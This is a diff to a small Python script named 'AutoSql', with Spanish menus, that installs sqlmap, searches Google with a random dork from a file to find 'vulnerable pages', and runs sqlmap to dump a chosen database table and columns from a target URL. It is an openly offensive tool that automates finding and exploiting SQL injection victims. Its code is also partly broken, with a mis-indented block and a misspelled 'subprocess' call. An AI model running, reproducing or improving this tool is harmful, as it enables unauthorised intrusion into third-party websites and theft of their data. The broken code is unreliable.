@@ -1,5 +1,7 @@
 from pyfiglet import Figlet
+from googlesearch import search
 import subprocess
+import random
 custom_fig = Figlet(font='big')
 print(custom_fig.renderText('AutoSql')), 
 
@@ -8,9 +10,9 @@ print('https://github.com/theRedpch')
 print("")
 print("")
 print('------------------------------------')
-print('[1]', 'Instalar sqlmap')
-print('[2]', 'Lanzar herramienta')
-opciones = [1,2]
+print('[1]' 'Instalar sqlmap')
+print('[2]' 'Encontrar paginas vulnerables')
+print('[3]' 'Lanzar herramienta')
 print('------------------------------------')
 
 select = int(input('Escriba la opcion que desea utilizar: '))
@@ -19,10 +21,20 @@ if select == 1:
 	subprocess.run(['sudo', 'apt-get', 'update'])
 	subprocess.run(['sudo', 'apt-get', 'install', 'sqlmap'])
 	
-if select >3:
-	print('Opcion no valida')
-	
 if select ==2:
+	import random
+lines = open('dorks.txt').read().splitlines()
+myline =random.choice(lines)
+print(myline)
+
+
+term = (myline)
+
+for i in search(term, num_results=50, lang='es'):
+	print(i)
+
+	
+if select ==3:
 
 	print('')
 	print('')
@@ -47,5 +59,7 @@ if select ==2:
 
 	ubprocess.run(['sqlmap', '-u', web,'-D', base,'-T', columna, '-C', valor_valor, '-dump' ])
 
+if select >4:
+	print('Opcion no valida')
 
 
